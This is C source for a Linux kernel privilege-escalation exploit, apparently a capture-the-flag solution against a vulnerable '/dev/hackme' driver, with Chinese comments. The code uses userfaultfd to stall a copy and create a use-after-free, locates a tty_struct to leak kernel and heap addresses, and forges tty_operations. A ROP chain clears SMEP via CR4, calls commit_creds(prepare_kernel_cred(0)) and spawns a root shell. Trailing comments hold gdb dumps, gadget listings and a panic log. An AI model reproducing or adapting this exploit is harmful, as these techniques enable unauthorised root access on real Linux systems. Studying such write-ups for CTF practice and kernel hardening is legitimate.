#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <signal.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <assert.h>

#define ALLOC 0x30000
#define DEL 0x30001
#define READ 0x30003
#define WRITE 0x30002

struct arg
{
    size_t idx;
    void *addr;
    long long len;
    long long offset;
};

void alloc(int fd,int idx,char *user,long long len){
    struct arg cmd;
    cmd.idx = idx;
    cmd.len = len;
    cmd.addr = user;
    ioctl(fd,ALLOC,&cmd);
}

void delete(int fd,int idx){
    struct arg cmd;
    cmd.idx = idx;
    ioctl(fd,DEL,&cmd);
}

void read_from_kernel(int fd,int idx,char *user,long long len,long long offset){
    struct arg cmd;
    cmd.idx = idx;
    cmd.len = len;
    cmd.addr = user;
    cmd.offset = offset;
    ioctl(fd,READ,&cmd);    
}
void write_to_kernel(int fd,int idx,char *user,long long len,long long offset){
    struct arg cmd;
    cmd.idx = idx;
    cmd.len = len;
    cmd.addr = user;
    cmd.offset = offset;
    ioctl(fd,WRITE,&cmd);   
}

void print_hex( char *buf,int size){
    int i;
    puts("======================================");
    printf("data :\n");
    for (i=0 ; i<(size/8);i++){
        if (i%2 == 0){
            printf("%d",i/2);
        }
        printf(" %16llx",*(size_t * )(buf + i*8));
        if (i%2 == 1){
            printf("\n");
        }       
    }
    puts("======================================");
}

size_t user_cs, user_ss,user_rflags, user_sp ,user_gs,user_es,user_fs,user_ds;
void save_status(){
    __asm__("mov %%cs, %0\n"
            "mov %%ss,%1\n"
            "mov %%rsp,%2\n"
            "pushfq\n"
            "pop %3\n"
            "mov %%gs,%4\n"
            "mov %%es,%5\n"
            "mov %%fs,%6\n"
            "mov %%ds,%7\n"
            ::"m"(user_cs),"m"(user_ss),"m"(user_sp),"m"(user_rflags),
            "m"(user_gs),"m"(user_es),"m"(user_fs),"m"(user_ds)
            );
    puts("[*]status has been saved.");
}
void sh(){
    system("sh");
    exit(0);
}
int (*commit_creds)(unsigned long cred);
unsigned long (*prepare_kernel_cred)(unsigned long cred);

void sudo(){
    commit_creds(prepare_kernel_cred(0));
    asm(
    "push %0\n"
    "push %1\n"
    "push %2\n"
    "push %3\n"
    "push %4\n"
    "push $0\n"       //rbp
    "swapgs\n"
    "pop %%rbp\n"     //rbp
    "iretq\n"
    ::"m"(user_ss),"m"(user_sp),"m"(user_rflags),"m"(user_cs),"a"(&sh)
    );
}
void errExit(char* msg)
{
  puts(msg);
  exit(-1);
}

void* handler(void *arg)
{
  struct uffd_msg msg;
  unsigned long uffd = (unsigned long)arg;
  puts("[+] handler created");

  struct pollfd pollfd;
  int nready;
  pollfd.fd      = uffd;
  pollfd.events  = POLLIN;
  nready = poll(&pollfd, 1, -1);
  if (nready != 1)  // 这会一直等待，直到copy_from_user/copy_to_user访问FAULT_PAGE
    errExit("[-] Wrong pool return value");
  printf("[+] Trigger! I'm going to hang\n");

  if (read(uffd, &msg, sizeof(msg)) != sizeof(msg)) // 从uffd读取msg结构，虽然没用
    errExit("[-] Error in reading uffd_msg");
  assert(msg.event == UFFD_EVENT_PAGEFAULT);
  printf("[+] fault page handler finished");
  sleep(1000);
  /*
  char buffer[0x1000];   // 预先设置好buffer内容，往缺页处进行拷贝
  struct uffdio_copy uc;
  memset(buffer, 0, sizeof(buffer));
  buffer[8] = 0xf0;

  uc.src = (unsigned long)buffer;
  uc.dst = (unsigned long)fault_page;
  uc.len = fault_page_len;
  uc.mode = 0;
  ioctl(uffd, UFFDIO_COPY, &uc); // 恢复执行copy_from_user
  */
  return 0;
}

void register_userfault(uint64_t fault_page, uint64_t fault_page_len)
{
  struct uffdio_api ua;
  struct uffdio_register ur;
  pthread_t thr;

  uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // create the user fault fd
  ua.api = UFFD_API;
  ua.features = 0;
  if (ioctl(uffd, UFFDIO_API, &ua) == -1)
    errExit("[-] ioctl-UFFDIO_API");
  //if (mmap(fault_page, fault_page_len, 7, 0x22, -1, 0) != fault_page) // PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,  //create page used for user fault
  //  errExit("[-] mmap fault page");
  ur.range.start = (unsigned long)fault_page;
  ur.range.len   = fault_page_len;
  ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
  if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
    errExit("[-] ioctl-UFFDIO_REGISTER");  //注册页地址与错误处理fd，这样只要copy_from_user
                         //访问到FAULT_PAGE，则访问被挂起，uffd会接收到信号
  int s = pthread_create(&thr, NULL, handler, (void*)uffd); // handler函数进行访存错误处理
  if (s!=0)
    errExit("[-] pthread_create");
    return;
}

#define SEARCH_SIZE 0x200000
int main(){
    save_status();
    int fd = open("/dev/hackme", 0);
    char *mem = malloc(SEARCH_SIZE);
    memset(mem,0,SEARCH_SIZE);
    uint64_t kernel_base, heap_base, ptm_unix98_ops = 0xffffffffb7825d80 - 0xffffffffb7200000; // 0x625D80
    if (fd < 0){
        printf("[-] bad open /dev/hackme\n");
        exit(-1);
    }
// Step 1 : 进程A 释放note0, size没有更改
    alloc(fd, 0, mem, SEARCH_SIZE);
    delete(fd, 0);
// Step 2 : 创建子进程B, 新建note0, 构造用户页错误处理在copy_from_user处挂起。构造(big size, small buf)
    if (fork() == 0)
    {
        mem = (char*)mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        uint64_t fault_page = (uint64_t)mem;
        uint64_t fault_page_len = 0x1000;
        register_userfault(fault_page, fault_page_len);

        alloc(fd, 0, mem, 0x2e0);
    }
// Step 3 : 搜索tty_struct结构，通过tty_struct结构泄露内核基址、堆地址
    sleep(2); // 等待子进程触发页错误
    int ptmx_fd = open("/dev/ptmx",0);
    if (ptmx_fd < 0)
        errExit("[-] bad open /dev/ptmx");
    printf("---- begin to find ptmx struct\n");
    uint64_t evil_buf[0x200/8];
    uint64_t ptmx_offset=0;
    int j = 0;

    for (int i=0; i<SEARCH_SIZE; i+=0x200)
    {
        read_from_kernel(fd, 0, (char*)evil_buf, 0x200, i);
        for (j = 0; j < 0x200/8; j++)     // 其实一般是对齐的，所以一般 j==0
            if (evil_buf[j] == 0x0000000100005401)
            {
                ptmx_offset = i+j*8;
                printf("[+] find ptmx struct at offset: 0x%lx\n", ptmx_offset);
                break;
            }
        if (ptmx_offset != 0)
            break;
    }
    if (ptmx_offset == 0)
        errExit("[-] Cannot find ptmx struct");
    // print_hex(evil_buf+j*8, 0x200 - j*8);
    kernel_base = evil_buf[3] - ptm_unix98_ops;
    heap_base   = evil_buf[7] - 0x38 - ptmx_offset;
    printf("[+] kernel_base = 0x%lx\n", kernel_base);
    printf("[+] heap_base   = 0x%lx\n", heap_base);
    prepare_kernel_cred = 0x4d3d0 + kernel_base;
    commit_creds        = 0x4d220 + kernel_base;

// Step 4 : 伪造tty_operations 并修改tty_struct中的tty_operations指针
    evil_buf[3] = (uint64_t)heap_base + 0x180;     // 指向 tty_operations
    evil_buf[0x38/8] = heap_base + 0x100;          // 指向 rop chain, tty_operations+13*8处放gadget 1 (最好放16个，不然会报错)
    write_to_kernel(fd, 0, evil_buf, sizeof(evil_buf), ptmx_offset);

    uint64_t fake_tty_operations[40];
    for (int i = 0; i < 0x10; i++)
        fake_tty_operations[0x80/8+i] = kernel_base + 0x5dbef; //改tty_operations中ioctl对应的指针 gadget 1:  mov rax, qword ptr [rbx + 0x38]; mov rdx, qword ptr [rax + 0xc8]; call rdx;
    fake_tty_operations[0xc8/8] = kernel_base + 0x200f66; //rop chain - gadget 2:  mov  rsp, rax;  pop  r12;  push r12; retn
    fake_tty_operations[0]  = kernel_base + 0x01b5a1; //pop rax ; ret
    fake_tty_operations[1]  = 0x6f0;
    fake_tty_operations[2]  = kernel_base + 0x0252b; //mov cr4, rax; push rcx; popfq; pop rbp; ret;
    fake_tty_operations[3]  = 0xdeadbeef;
    fake_tty_operations[4]  = &sudo;
    write_to_kernel(fd, 0, fake_tty_operations, sizeof(fake_tty_operations), 0x100);
    ioctl(ptmx_fd,0xdeadbeef,0xdeadbabe);   //ioctl()位于tty_operations第13个
}

/*
打印出来的tty_struct结构，可以看到tty_operations在内核空间中，好多struct都在内核空间中
[+] find ptmx struct at offset: 0x400
======================================
data :
0        100005401                0
1 ffff8dfb0ddc3780 ffffffff87025d80     <-------- 内核地址
2                0                0
3                0 ffff8dfb0dddd438     <-------- 堆地址
4 ffff8dfb0dddd438 ffff8dfb0dddd448
5 ffff8dfb0dddd448 ffff8dfb0013d5f0
6                0 ffff8dfb0dddd468
7 ffff8dfb0dddd468                0
8 ffff8dfb0dddd480 ffff8dfb0dddd480
9                0 ffff8dfb0dddd498
10 ffff8dfb0dddd498                0
11 ffff8dfb0dddd4b0 ffff8dfb0dddd4b0
12                0 ffff8dfb0dddd4c8
13 ffff8dfb0dddd4c8                0
14               bf  10004157f1c0300
15 170f12001a131100     960000000016
======================================
*/

/*
总结：tty_struct+0x18指向伪造的tty_operations，tty_operations+13处放gadget 1，
     tty_struct+0xc8放gadget 2，tty_struct+0x38`处指向rop chain即可。
     
Gadget:
    0xffffffff8101b5a1 : pop rax ; ret
    0xffffffff8100252b : mov cr4, rax ; push rcx ; popfq ; pop rbp ; ret

gadget 1:    rbx和rdi指向tty_struct
.text:000000000005DBEF                 mov     rax, [rbx+38h]
.text:000000000005DBF3                 lea     rdi, [rbx+20h]
.text:000000000005DBF7                 mov     rdx, [rax+0C8h]
.text:000000000005DBFE                 test    rdx, rdx
.text:000000000005DC01                 jz      loc_5D805
.text:000000000005DC07                 call    rdx

gadget 2:
.text:0000000000200F66                 mov     rsp, rax
.text:0000000000200F69                 jmp     loc_200EE7

.text:0000000000200EE7                 pop     r12
.text:0000000000200EE9                 mov     rdi, rsp
.text:0000000000200EEC                 call    sub_16190
.text:0000000000200EF1                 mov     rsp, rax
.text:0000000000200EF4                 lea     rbp, [rsp+70h+var_6F]
.text:0000000000200EF9                 push    r12
.text:0000000000200EFB                 retn




hackme 16384 - - Live 0xffffffffc0251000 (O)
ffffffff8184d160 T prepare_creds
ffffffff81ec9c38 r __ksymtab_prepare_creds
ffffffff81ecf8bc r __kstrtab_prepare_creds

/home/pwn # cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff8184d3d0 T prepare_kernel_cred
/home/pwn # cat /proc/kallsyms | grep commit_creds
ffffffff8184d220 T commit_creds




debug:

(gdb) x /20xg 0xffffffffc019f000+0x2400                            <---------- pool 堆块列表
0xffffffffc01a1400: 0xffff9f8e8e6b1000  0x0000000000000400
0xffffffffc01a1410: 0xffff9f8e8e6b1400  0x0000000000000400
0xffffffffc01a1420: 0x0000000000000000  0x0000000000000400
0xffffffffc01a1430: 0xffff9f8e8e6b1c00  0x0000000000000400
0xffffffffc01a1440: 0x0000000000000000  0x0000000000000400
0xffffffffc01a1450: 0xffff9f8e8e720400  0x0000000000000400         为什么堆块地址来了个跳跃？
0xffffffffc01a1460: 0x0000000000000000  0x0000000000000000
(gdb) x /10xg 0xffff9f8e8e720000
0xffff9f8e8e720000: 0xffff9f8e8e720800  0x4141414141414141



(gdb) x /30xg 0xffff9f8e8e720000                  chunk4            <---------tty_struct      before change
0xffff9f8e8e720000: 0x0000000100005401  0x0000000000000000
0xffff9f8e8e720010: 0xffff9f8e8e697780  0xffffffff8b425d80
0xffff9f8e8e720020: 0x0000000000000000  0x0000000000000000
0xffff9f8e8e720030: 0x0000000000000000  0xffff9f8e8e720038

(gdb) x /30xg 0xffff9f8e8e720000                              <---------tty_struct      after change
0xffff9f8e8e720000: 0x0000000100005401  0x0000000000000000
0xffff9f8e8e720010: 0xffff9f8e8e697780  0xffff9f8e8e720420             <--- chunk5
0xffff9f8e8e720020: 0x0000000000000000  0x0000000000000000
0xffff9f8e8e720030: 0x0000000000000000  0xffff9f8e8e720620             <--- chunk5


(gdb) x /40xg 0xffff9f8e8e720420
0xffff9f8e8e720420: 0xffffffff8ae5dbef  0xffffffff8ae5dbef
0xffff9f8e8e720430: 0xffffffff8ae5dbef  0xffffffff8ae5dbef
0xffff9f8e8e720440: 0xffffffff8ae5dbef  0xffffffff8ae5dbef
0xffff9f8e8e720450: 0xffffffff8ae5dbef  0xffffffff8ae5dbef
0xffff9f8e8e720460: 0xffffffff8ae5dbef  0xffffffff8ae5dbef
0xffff9f8e8e720470: 0xffffffff8ae5dbef  0xffffffff8ae5dbef
0xffff9f8e8e720480: 0xffffffff8ae5dbef  0xffffffff8ae5dbef
0xffff9f8e8e720490: 0xffffffff8ae5dbef  0xffffffff8ae5dbef

(gdb) x /40xg 0xffff9f8e8e720620
0xffff9f8e8e720620: 0xffffffff8ae1b5a1  0x00000000000006f0     //pop rax; ret
0xffff9f8e8e720630: 0xffffffff8ae0252b  0x00000000deadbeef      //mov cr4, rax; push rcx; popfq; pop rbp; ret;
0xffff9f8e8e720640: 0x0000000000400c76  0x0000000fffffffe0
0xffff9f8e8e720650: 0xffff9f8e8e720250  0xffff9f8e8e720250
0xffff9f8e8e720660: 0xffffffff8af6dd00  0xffff9f8e8e6a7e00


0x5dbef  位于sub_5D6D0函数里
/home/pwn # cat /proc/kallsyms | grep ffffffffb2e5d6d0
ffffffffb2e5d6d0 t __setup_irq

*/


/* kernel panic

[    9.173878] general protection fault: 0000 [#1] NOPTI
[    9.174524] CPU: 0 PID: 32 Comm: exp Tainted: G           O      4.20.13 #10
[    9.174723] RIP: 0010:0x4343434343434343
[    9.174944] Code: Bad RIP value.
[    9.175065] RSP: 0018:ffffc90000097d78 EFLAGS: 00000202
[    9.175183] RAX: 4343434343434343 RBX: ffff88800e962000 RCX: 00000000deadbeef
[    9.175346] RDX: 00000000deadbabe RSI: 00000000deadbeef RDI: ffff88800e962000
[    9.175500] RBP: ffffc90000097e10 R08: 00000000deadbabe R09: 00000000dead6ae1
[    9.175621] R10: 0000000000000000 R11: 0000000000000000 R12: 00000000deadbeef
[    9.175738] R13: 00000000deadbabe R14: ffff88800017bc00 R15: ffff88800e962800
[    9.175883] FS:  000000000198c880(0000) GS:ffffffff81836000(0000) knlGS:0000000000000000
[    9.176194] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    9.176293] CR2: 00000000019918a8 CR3: 000000000e964000 CR4: 00000000003006b0

   0xffffffff8105dbef:  mov    rax,QWORD PTR [rbx+0x38]
   0xffffffff8105dbf3:  lea    rdi,[rbx+0x20]
   0xffffffff8105dbf7:  mov    rdx,QWORD PTR [rax+0xc8]
   0xffffffff8105dbfe:  test   rdx,rdx
   0xffffffff8105dc01:  je     0xffffffff8105d805
   0xffffffff8105dc07:  call   rdx


   0xffffffff81200f66:  mov    rsp,rax
   0xffffffff81200f69:  jmp    0xffffffff81200ee7
   0xffffffff81200ee7:  pop    r12
   0xffffffff81200ee9:  mov    rdi,rsp
   0xffffffff81200eec:  call   0xffffffff81016190
   0xffffffff81200ef1:  mov    rsp,rax
   0xffffffff81200ef4:  lea    rbp,[rsp+0x1]
   0xffffffff81200ef9:  push   r12
   0xffffffff81200efb:  ret  
*/